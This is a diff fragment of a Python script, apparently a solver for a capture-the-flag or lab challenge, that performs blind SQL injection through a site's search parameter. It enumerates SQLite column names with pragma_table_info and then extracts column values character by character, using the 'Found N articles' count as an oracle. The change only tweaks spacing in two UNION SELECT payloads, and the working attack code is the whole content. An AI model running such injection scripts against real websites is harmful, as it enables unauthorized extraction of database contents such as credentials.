@@ -38,7 +38,7 @@ while len(search_list) > 0:
     found = False
     for char in string.printable:
         guess = previous_guess + char
-        request = s.get(f"{link}/?search=' UNION SELECT null, substr(name, 1, {len(guess)}) as n, null FROM pragma_table_info('{table_name}') WHERE n = '{guess}';--")
+        request = s.get(f"{link}/?search='UNION SELECT null, substr(name, 1, {len(guess)}) as n, null FROM pragma_table_info('{table_name}') WHERE n = '{guess}';--")
         # get the number of articles
         try:
             sentence = re.findall(r'Found \d+ articles', request.text)[0] 
@@ -64,7 +64,7 @@ while len(search_list) > 0:
         if char == '+':
             continue
         guess = previous_guess + char
-        request = s.get(f"{link}/?search=' UNION SELECT null, substr({column_name}, 1, {len(guess)}) as n, null FROM {table_name} WHERE n = '{guess}';--")
+        request = s.get(f"{link}/?search='UNION SELECT null, substr({column_name}, 1, {len(guess)}) as n, null FROM {table_name} WHERE n = '{guess}';--")
         # get the number of articles
         try:
             sentence = re.findall(r'Found \d+ articles', request.text)[0] 
